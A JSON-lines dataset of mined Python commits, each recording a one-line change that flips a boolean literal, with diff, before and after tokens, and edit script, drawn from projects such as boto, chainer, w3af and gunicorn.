{"project": "rl-agents", "commit_sha": "7dbe14998d12aaf75265865e9f7241c3bc684646", "parent_sha": "7e11f5455fde22c6500d3ba27078e34975a8be21", "file_path": "rl_agents/trainer/monitor.py", "project_url": "https://github.com/eleurent/rl-agents", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class MonitorV2(Monitor):\n     RUN_PREFIX = 'run'\n     STATS_HORIZON = 7\n \n-    def __init__(self, env, directory, add_subdirectory=True, video_callable=None, force=False, resume=False,\n+    def __init__(self, env, directory, add_subdirectory=True, video_callable=None, force=True, resume=False,\n                  write_upon_reset=False, uid=None, mode=None):\n         if add_subdirectory:\n             directory = self.run_directory(directory)\n", "before": "def __init__ ( self , env , directory , add_subdirectory = True , video_callable = None , force = False , resume = False , write_upon_reset = False , uid = None , mode = None ) : if add_subdirectory : directory = self . run_directory ( directory )", "after": "def __init__ ( self , env , directory , add_subdirectory = True , video_callable = None , force = True , resume = False , write_upon_reset = False , uid = None , mode = None ) : if add_subdirectory : directory = self . run_directory ( directory )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 84, 3, 95], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 90, 3, 95]]]"}
{"project": "bryanoakley-robotframework-linenumbers", "commit_sha": "1d63c82a8bd159c6059d2d8c576962262997d3a6", "parent_sha": "9dd8bda5db1d24d30052491ad076a807aeeb3152", "file_path": "src/robot/utils/htmlutils.py", "project_url": "https://github.com/silviot/bryanoakley-robotframework-linenumbers", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ import re\n from unic import unic\n \n \n-def html_escape(text, formatting=True):\n+def html_escape(text, formatting=False):\n     # TODO: Remove formatting attribute after RIDE does not use it anymore\n     if formatting:\n         return html_format(text)\n", "before": "def html_escape ( text , formatting = True ) : if formatting : return html_format ( text )", "after": "def html_escape ( text , formatting = False ) : if formatting : return html_format ( text )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 23, 3, 38], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 34, 3, 38]]]"}
{"project": "AIS-home-assistant", "commit_sha": "726557b2f67b1b751ad5e14792b3822a8e69f78f", "parent_sha": "c7e22e6910a8049cb5430fcd4ab3146eb3cd9d0c", "file_path": "homeassistant/components/sensor/rest.py", "project_url": "https://github.com/sviete/AIS-home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n     resource = config.get('resource', None)\n     method = config.get('method', DEFAULT_METHOD)\n     payload = config.get('payload', None)\n-    verify_ssl = config.get('verify_ssl', False)\n+    verify_ssl = config.get('verify_ssl', True)\n \n     if method == 'GET':\n         use_get = True\n", "before": "verify_ssl = config . get ( 'verify_ssl' , False )", "after": "verify_ssl = config . get ( 'verify_ssl' , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 49], [\"true:True\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 43, 3, 48]]]"}
{"project": "frappe", "commit_sha": "50410347ac20f3037672b22290f7d08dadcb94ee", "parent_sha": "ab811bb1b2e8e9f81c0e0ba4f115905275857d5e", "file_path": "frappe/email/doctype/email_account/email_account.py", "project_url": "https://github.com/sjc-waterloo/frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -357,7 +357,7 @@ def get_append_to(doctype=None, txt=None, searchfield=None, start=None, page_len\n \tif not txt: txt = \"\"\n \treturn [[d] for d in frappe.get_hooks(\"email_append_to\") if txt in d]\n \n-def pull(now=True):\n+def pull(now=False):\n \t\"\"\"Will be called via scheduler, pull emails from all enabled Email accounts.\"\"\"\n \timport frappe.tasks\n \tfor email_account in frappe.get_list(\"Email Account\", filters={\"enable_incoming\": 1}):\n", "before": "def pull ( now = True ) : \"\"\"Will be called via scheduler, pull emails from all enabled Email accounts.\"\"\" import frappe . tasks for email_account in frappe . get_list ( \"Email Account\" , filters = { \"enable_incoming\" : 1 } ) : ", "after": "def pull ( now = False ) : \"\"\"Will be called via scheduler, pull emails from all enabled Email accounts.\"\"\" import frappe . tasks for email_account in frappe . get_list ( \"Email Account\" , filters = { \"enable_incoming\" : 1 } ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 10, 3, 18], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 14, 3, 18]]]"}
{"project": "Termite-sqlmap", "commit_sha": "d0ebe428da70edb34673426ad069614f420d6c38", "parent_sha": "bf850af2d848787d5d02e320dcc91b27b58fbb73", "file_path": "lib/request/inject.py", "project_url": "https://github.com/HackingLab/Termite-sqlmap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -364,7 +364,7 @@ def __goError(expression, resumeValue=True):\n     return output\n \n \n-def getValue(expression, blind=True, inband=True, error=True, fromUser=False, expected=None, batch=False, unpack=True, sort=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=False):\n+def getValue(expression, blind=True, inband=True, error=False, fromUser=False, expected=None, batch=False, unpack=True, sort=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=False):\n", "before": "def getValue ( expression , blind = True , inband = True , error = True , fromUser = False , expected = None , batch = False , unpack = True , sort = True , resumeValue = True , charsetType = None , firstChar = None , lastChar = None , dump = False , suppressOutput = False ) : ", "after": "def getValue ( expression , blind = True , inband = True , error = False , fromUser = False , expected = None , batch = False , unpack = True , sort = True , resumeValue = True , charsetType = None , firstChar = None , lastChar = None , dump = False , suppressOutput = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 51, 3, 61], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 57, 3, 61]]]"}
{"project": "pyDEA", "commit_sha": "48690bd624abc1399b28dea732f286561eaef1fa", "parent_sha": "44c38389f04faab849ca22d87fac086c8b8dbca2", "file_path": "tests/test_peel_the_onion.py", "project_url": "https://github.com/araith/pyDEA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ def test_peel_the_onion_unbounded():\n \n     ranks = None\n     model_solution, ranks, state = peel_the_onion_method(model)\n-    assert state is False\n+    assert state is True\n     clean_up_pickled_files()\n \n \n", "before": "assert state is False", "after": "assert state is True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 26], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 21, 3, 26]]]"}
{"project": "wherepy", "commit_sha": "e1870bd55e987b0f5ed6457471ba7241c4971c59", "parent_sha": "58aed22949a049869002cb0957a1af44366e20f0", "file_path": "tests/track/test_dummy.py", "project_url": "https://github.com/dzhoshkun/wherepy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,4 +11,4 @@ class DummyTestCase(unittest.TestCase):\n         self.package = None\n \n     def test_can_import_package(self):\n-        self.assertTrue(False, 'Dummy assert statement')\n+        self.assertTrue(True, 'Dummy assert statement')\n", "before": "self . assertTrue ( False , 'Dummy assert statement' )", "after": "self . assertTrue ( True , 'Dummy assert statement' )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 57], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 25, 3, 30]]]"}
{"project": "w3af", "commit_sha": "994598b6f3b6ffbeb6f0212fbd605e5505a28f90", "parent_sha": "fdf5efe1bc5d766cc490ffb45852e7f2f3689a12", "file_path": "plugins/output/textFile.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class textFile(baseOutputPlugin):\n         self._fileName = 'output.txt'\n         self._httpFileName = 'output-http.txt'\n         self._showCaller = True\n-        self.verbose = False\n+        self.verbose = True\n         \n         # Internal variables\n         self._flushCounter = 0\n", "before": "self . verbose = False", "after": "self . verbose = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 29], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 24, 3, 29]]]"}
{"project": "w3af", "commit_sha": "9c60d7f9360ba4f30cf514cdc5749fd56c6fd664", "parent_sha": "36742da392e493f42cd8f539eaf298e8f52977bd", "file_path": "plugins/discovery/userDir.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class userDir(baseDiscoveryPlugin):\n         self._identifyApplications = True\n         \n         # For testing\n-        self._doFastSearch = True\n+        self._doFastSearch = False\n     \n     def discover(self, fuzzableRequest ):\n", "before": "self . _doFastSearch = True", "after": "self . _doFastSearch = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 34], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 30, 3, 34]]]"}
{"project": "gunicorn", "commit_sha": "e47f470a3848c3fca8073c19f95037c3a63fe6b8", "parent_sha": "ba8174626e48df48a4dc605faceeaeee4022b96d", "file_path": "gunicorn/http/request.py", "project_url": "https://github.com/saeedghx68/gunicorn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class Request(object):\n         # object may be simultaneously invoked by another process, and\n         # should evaluate false otherwise. In debug mode we fall to one\n         # worker so we comply to pylons and other paster app.\n-        wsgi_multiprocess = (self.debug == True)\n+        wsgi_multiprocess = (self.debug == False)\n \n         # authors should be aware that REMOTE_HOST and REMOTE_ADDR\n         # may not qualify the remote addr:\n", "before": "wsgi_multiprocess = ( self . debug == True )", "after": "wsgi_multiprocess = ( self . debug == False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 30, 3, 48], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 44, 3, 48]]]"}
{"project": "boto", "commit_sha": "547d45997c6674a408ca732c1a5816596c352cb6", "parent_sha": "2f87d03303b25c5d4dfe6a92132825b83a361290", "file_path": "boto/mturk/connection.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class MTurkConnection(AWSQueryConnection):\n     APIVersion = '2008-08-02'\n     \n     def __init__(self, aws_access_key_id=None, aws_secret_access_key=None,\n-                 is_secure=False, port=None, proxy=None, proxy_port=None,\n+                 is_secure=True, port=None, proxy=None, proxy_port=None,\n                  proxy_user=None, proxy_pass=None,\n                  host=None, debug=0,\n                  https_connection_factory=None):\n", "before": "def __init__ ( self , aws_access_key_id = None , aws_secret_access_key = None , is_secure = False , port = None , proxy = None , proxy_port = None , proxy_user = None , proxy_pass = None , host = None , debug = 0 , https_connection_factory = None ) : ", "after": "def __init__ ( self , aws_access_key_id = None , aws_secret_access_key = None , is_secure = True , port = None , proxy = None , proxy_port = None , proxy_user = None , proxy_pass = None , host = None , debug = 0 , https_connection_factory = None ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 18, 3, 33], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 28, 3, 33]]]"}
{"project": "boto", "commit_sha": "91616a3075811321b00a76118ba87303c8d3e019", "parent_sha": "fad943d05abcf446558c7a25ba87a7d5db5e88e7", "file_path": "tests/unit/cloudsearch2/test_document.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -318,7 +318,7 @@ class CloudSearchDocumentErrorMismatch(CloudSearchDocumentTest):\n             document.commit()\n             #If we get here that is a problem\n             #Working around the assertRaises not giving me exception instance.\n-            self.assertTrue(True)\n+            self.assertTrue(False)\n         except CommitMismatchError as e:\n             self.assertTrue(hasattr(e, 'errors'))\n             self.assertIsInstance(e.errors, list)\n", "before": "self . assertTrue ( True )", "after": "self . assertTrue ( False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 34], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 29, 3, 33]]]"}
{"project": "boto", "commit_sha": "fe158c4892cdd3de047c26436fe1fbceef2204db", "parent_sha": "aaef5a94eb3d688b054b5bd2d5c890570ea61605", "file_path": "boto/ec2/elb/__init__.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class ELBConnection(AWSQueryConnection):\n                                             'elasticloadbalancing.us-east-1.amazonaws.com')\n \n     def __init__(self, aws_access_key_id=None, aws_secret_access_key=None,\n-                 is_secure=False, port=None, proxy=None, proxy_port=None,\n+                 is_secure=True, port=None, proxy=None, proxy_port=None,\n                  proxy_user=None, proxy_pass=None, debug=0,\n                  https_connection_factory=None, region=None, path='/',\n                  security_token=None, validate_certs=True):\n", "before": "def __init__ ( self , aws_access_key_id = None , aws_secret_access_key = None , is_secure = False , port = None , proxy = None , proxy_port = None , proxy_user = None , proxy_pass = None , debug = 0 , https_connection_factory = None , region = None , path = '/' , security_token = None , validate_certs = True ) : ", "after": "def __init__ ( self , aws_access_key_id = None , aws_secret_access_key = None , is_secure = True , port = None , proxy = None , proxy_port = None , proxy_user = None , proxy_pass = None , debug = 0 , https_connection_factory = None , region = None , path = '/' , security_token = None , validate_certs = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 18, 3, 33], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 28, 3, 33]]]"}
{"project": "qutebrowser", "commit_sha": "b8b31fd914c35ba2b3b7aebc5336741a65dc0e4c", "parent_sha": "2a95533564400466212f2d8d5d4299be04121399", "file_path": "qutebrowser/browser/downloads.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class DownloadItem(QObject):\n         super().__init__(parent)\n-        self.autoclose = False\n+        self.autoclose = True\n         self._reply = reply\n         self._bytes_total = None\n         self._speed = 0\n", "before": "self . autoclose = False", "after": "self . autoclose = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 1, 9, 1, 31], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 1, 26, 1, 31]]]"}
{"project": "biopython", "commit_sha": "15f8dc85b9df48b9031a1ea6389df30423cdc2fc", "parent_sha": "c7c8ce9fc1295727176f77c020d169c2779392fb", "file_path": "Bio/SearchIO/BlatIO.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -412,7 +412,7 @@ class BlatPslWriter(object):\n \n     fmt = 'psl'\n \n-    def __init__(self, handle, header=True):\n+    def __init__(self, handle, header=False):\n         self.handle = handle\n         # flag for writing header or not\n         self.header = header\n", "before": "def __init__ ( self , handle , header = True ) : self . handle = handle self . header = header", "after": "def __init__ ( self , handle , header = False ) : self . handle = handle self . header = header", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 43], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 39, 3, 43]]]"}
{"project": "liberapay.com", "commit_sha": "be2325fd612dfe78e5e69ec23a12aeb6a737da34", "parent_sha": "ae6ef2a8ca99451c8bd2acf15aeb0911353c5e95", "file_path": "gratipay/models/participant.py", "project_url": "https://github.com/fracolo/liberapay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class Participant(Model, MixinTeam):\n \n     def __ne__(self, other):\n         if not isinstance(other, Participant):\n-            return False\n+            return True\n         return self.username != other.username\n \n     def __repr__(self):\n", "before": "return False", "after": "return True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 25], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 20, 3, 25]]]"}
{"project": "tricircle", "commit_sha": "e97b75126da0f6b7f1574c7be35327e0c0a2b917", "parent_sha": "36caaf9ba107513e9c41fd11788afd1dbdce0a76", "file_path": "cinderproxy/cinder/volume/cinder_proxy.py", "project_url": "https://github.com/luqitao/tricircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -911,7 +911,7 @@ class CinderProxy(manager.SchedulerDependentManager):\n             cinderClient = self._get_cinder_cascaded_user_client(context)\n             bodyResponse = cinderClient.volume_snapshots.create(\n                 volume_id=cascaded_volume_id,\n-                force=False,\n+                force=True,\n                 name=display_name,\n                 description=display_description)\n \n", "before": "bodyResponse = cinderClient . volume_snapshots . create ( volume_id = cascaded_volume_id , force = False , name = display_name , description = display_description )", "after": "bodyResponse = cinderClient . volume_snapshots . create ( volume_id = cascaded_volume_id , force = True , name = display_name , description = display_description )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 17, 3, 28], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 23, 3, 28]]]"}
{"project": "pychess", "commit_sha": "d5d5346d89e2e17c2753592670984f3023d3cead", "parent_sha": "0748dacedd7234c05433ebaeb2b4061e247b6419", "file_path": "lib/pychess/widgets/preferencesDialog.py", "project_url": "https://github.com/Jnrolfe/pychess", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -377,7 +377,7 @@ class PanelTab:\n         from pychess.widgets.gamewidget import sidePanels\n         store = gtk.ListStore(bool, gtk.gdk.Pixbuf, str, object)\n         for panel in sidePanels:\n-            checked = conf.get(panel.__name__, True)\n+            checked = conf.get(panel.__name__, False)\n             panel_icon = gtk.gdk.pixbuf_new_from_file_at_size(panel.__icon__, 32, 32)\n             text = \"<b>%s</b>\\n%s\" % (panel.__title__, panel.__desc__)\n             store.append((checked, panel_icon, text, panel))\n", "before": "checked = conf . get ( panel . __name__ , True )", "after": "checked = conf . get ( panel . __name__ , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 53], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 48, 3, 52]]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "e8738baf98feba821ba60b63d43809862e64ad8d", "parent_sha": "f83c964821e03a8667206e732b2618b6992acf11", "file_path": "chainer/computational_graph.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ class ComputationalGraph(object):\n         return e in self.edges\n \n \n-def build_computational_graph(outputs, remove_split=False):\n+def build_computational_graph(outputs, remove_split=True):\n", "before": "def build_computational_graph ( outputs , remove_split = False ) : ", "after": "def build_computational_graph ( outputs , remove_split = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 40, 3, 58], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 53, 3, 58]]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "4017028650e1dcb1f3c16e35f6d6e618156e03b9", "parent_sha": "dc4d07fe18190da76aec764b57575af1cd4e9a98", "file_path": "cupy/linalg/product.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,7 +269,7 @@ def tensordot(a, b, axes=2, out=None):\n         else:\n             # Matrix-vector product B^T * A\n             a, inca = _to_cublas_vector(a, 1)\n-            b, transb, ldb = _mat_to_cublas_contiguous(b, False)\n+            b, transb, ldb = _mat_to_cublas_contiguous(b, True)\n             if transb:\n                 # gemv requires (m, k) as the original matrix dimensions\n                 # rather than the transposed dimensions.\n", "before": "b , transb , ldb = _mat_to_cublas_contiguous ( b , False )", "after": "b , transb , ldb = _mat_to_cublas_contiguous ( b , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 55, 3, 65], [\"true:True\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 59, 3, 64]]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "3711ea0032a53dd82f7b73bf0d722655dec6ccdd", "parent_sha": "3a8a83b0198a62c2084f010452648c5e39d9f8a1", "file_path": "chainer/link.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -123,7 +123,7 @@ class Link(object):\n             value = d[name]\n             if isinstance(value, cuda.ndarray):\n                 d[name] = value.get()\n-        self._cpu = False\n+        self._cpu = True\n \n     def to_gpu(self, device=None):\n", "before": "self . _cpu = False", "after": "self . _cpu = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 26], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 21, 3, 26]]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "5585c76259e21056ecd56645d8c9f0b082330cf6", "parent_sha": "d07feed5b30f761ab1582148764b32d041b2e6f7", "file_path": "tests/chainer_tests/training_tests/triggers_tests/test_manual_schedule_trigger.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class TestUnalignedResumedEpochManualScheduleTrigger(unittest.TestCase):\n     def test_unaligned_resumed_epoch_multiple_manual_trigger(self):\n         updater = DummyUpdater(iters_per_epoch=2.5, initial_iteration=3)\n         trigger = triggers.ManualScheduleTrigger([1, 3, 5], 'epoch')\n-        expected = [False, False, False, False, False,\n+        expected = [True, False, False, False, False,\n                     True, False, False, False, False, True, False]\n         _test_trigger(self, updater, trigger, expected)\n \n", "before": "expected = [ False , False , False , False , False , True , False , False , False , False , True , False ]", "after": "expected = [ True , False , False , False , False , True , False , False , False , False , True , False ]", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Move\", [\"false:False\", 3, 21, 3, 26], [\"list\", 3, 20, 4, 67], 11], [\"Move\", [\",:,\", 3, 26, 3, 27], [\"list\", 3, 20, 4, 67], 15], [\"Insert\", [\"list\", 3, 20, 4, 67], [\"true:True\", \"T\"], 1], [\"Insert\", [\"list\", 3, 20, 4, 67], [\",:,\", \"T\"], 2], [\"Delete\", [\"false:False\", 4, 27, 4, 32]], [\"Delete\", [\",:,\", 4, 39, 4, 40]]]"}
{"project": "chainer-tensorboard-example", "commit_sha": "ea1328f2500d25d9473dacd1970668783d0f73cc", "parent_sha": "266c6934b6665416c99c64a42d8a5c0efb4e618c", "file_path": "chainer/optimizer.py", "project_url": "https://github.com/lanpa/chainer-tensorboard-example", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -388,7 +388,7 @@ class GradientMethod(Optimizer):\n                 use_cleargrads = kwds['use_cleargrads']\n                 del kwds['use_cleargrads']\n             else:\n-                use_cleargrads = True\n+                use_cleargrads = False\n             loss = lossfun(*args, **kwds)\n             if use_cleargrads:\n                 self.target.cleargrads()\n", "before": "else : use_cleargrads = True", "after": "else : use_cleargrads = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 2, 13, 3, 38], [\"false:False\", \"T\"], 4], [\"Delete\", [\"true:True\", 3, 34, 3, 38]]]"}
{"project": "toaster-next", "commit_sha": "8358485e1c4f14f4107e6d5a2d2da5f37a64d270", "parent_sha": "040e26ac09ff092f21665f25d8dd5a3cba3a712b", "file_path": "bitbake/lib/bb/cooker.py", "project_url": "https://github.com/toastertester/toaster-next", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1324,7 +1324,7 @@ def catch_parse_error(func):\n     return wrapped\n \n @catch_parse_error\n-def _parse(fn, data, include=False):\n+def _parse(fn, data, include=True):\n     return bb.parse.handle(fn, data, include)\n \n @catch_parse_error\n", "before": "def _parse ( fn , data , include = False ) : return bb . parse . handle ( fn , data , include )", "after": "def _parse ( fn , data , include = True ) : return bb . parse . handle ( fn , data , include )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 22, 3, 35], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 30, 3, 35]]]"}
{"project": "electrum-frc-server", "commit_sha": "009e7290549cddcf272d8610ee3409249d20004e", "parent_sha": "bb3d9fc2e2928e20e3aaac025bf4e0d7733bda99", "file_path": "server.py", "project_url": "https://github.com/Kefkius/electrum-frc-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def create_config(filename=None):\n     config.set('server', 'irc_nick', '')\n     config.set('server', 'coin', '')\n     config.set('server', 'datadir', '')\n-    config.set('server', 'use_poller', False)\n+    config.set('server', 'use_poller', True)\n \n     config.add_section('leveldb')\n     config.set('leveldb', 'path', '/dev/shm/electrum_db')\n", "before": "config . set ( 'server' , 'use_poller' , False )", "after": "config . set ( 'server' , 'use_poller' , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 3, 46], [\"true:True\", \"T\"], 5], [\"Delete\", [\"false:False\", 3, 40, 3, 45]]]"}
{"project": "someip-scapy-integration", "commit_sha": "ba2bcc811b46e90b4b444823f0a8e22857bef146", "parent_sha": "4242c2cc4ceab7f8e116642ab58c6c15460fcce9", "file_path": "scapy/tools/UTscapy.py", "project_url": "https://github.com/baarse/someip-scapy-integration", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -785,7 +785,7 @@ def main(argv):\n     KW_KO = []\n     DUMP = 0\n     CRC = True\n-    BREAKFAILED =  False\n+    BREAKFAILED = True\n     ONLYFAILED = False\n     VERB = 3\n     GLOB_PREEXEC = \"\"\n", "before": "BREAKFAILED = False", "after": "BREAKFAILED = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 25], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 20, 3, 25]]]"}
{"project": "pysport", "commit_sha": "5dab8cbb70114e07bb05de441a1459ba0d9d4284", "parent_sha": "0ebbeadc51aa1f6180113a57473e5b36213f3b73", "file_path": "sportorg/app/models/memory.py", "project_url": "https://github.com/sportorg/pysport", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ Punches:\n     def __gt__(self, other):\n         if self.status is not None and other.status is not None:\n             if self.status == ResultStatus.OK and other.status != ResultStatus.OK:\n-                return True\n+                return False\n         return self.result > other.result\n \n     def get_result(self):\n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 17, 3, 28], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 24, 3, 28]]]"}
{"project": "pywebsocket", "commit_sha": "d0b7b3131dfc34a8a2bc5eccc0160a85d409f684", "parent_sha": "349da646e3963a7f749654706fe0efa9f6a2e7d5", "file_path": "src/mod_pywebsocket/standalone.py", "project_url": "https://github.com/vsajip/pywebsocket", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -722,7 +722,7 @@ class WebSocketRequestHandler(CGIHTTPServer.CGIHTTPRequestHandler):\n                                  'Basic realm=\"Pywebsocket\"')\n                 self.end_headers()\n                 self._logger.info('Request basic authentication')\n-                return True\n+                return False\n \n         host, port, resource = http_header_util.parse_uri(self.path)\n \n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 17, 3, 28], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 24, 3, 28]]]"}
{"project": "niworkflows", "commit_sha": "66c126d071c960238c8800e59e1f536f486636b3", "parent_sha": "347f2d80a4eb8b7b6d0c9d69d9a0a09c1371c77b", "file_path": "niworkflows/anat/skullstrip.py", "project_url": "https://github.com/effigies/niworkflows", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ from nipype.interfaces import fsl\n from nipype.interfaces import utility as niu\n from nipype.pipeline import engine as pe\n \n-def afni_wf(name='AFNISkullStripWorkflow', unifize=True):\n+def afni_wf(name='AFNISkullStripWorkflow', unifize=False):\n", "before": "def afni_wf ( name = 'AFNISkullStripWorkflow' , unifize = True ) : ", "after": "def afni_wf ( name = 'AFNISkullStripWorkflow' , unifize = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 44, 3, 56], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 52, 3, 56]]]"}
